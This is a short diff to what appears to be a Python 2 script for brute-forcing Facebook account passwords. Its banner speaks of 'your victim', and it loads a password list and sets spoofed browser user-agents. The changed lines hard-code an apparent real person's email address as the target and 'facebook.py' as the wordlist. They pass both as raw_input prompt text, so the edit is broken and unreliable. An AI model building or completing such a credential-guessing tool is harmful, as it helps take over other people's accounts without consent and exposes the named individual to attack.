@@ -32,8 +32,9 @@ print "# Hit CTRL+C to quit the program"
 print "# Use www.graph.facebook.com for more infos about your victim ^_^"
 
 
-email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
-passwordlist = str(raw_input("Enter the name of the password list file : "))
+email = str(raw_input("kee.marie@hotmail.com"))
+                    
+passwordlist = str(raw_input("facebook.py"))
 
 useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
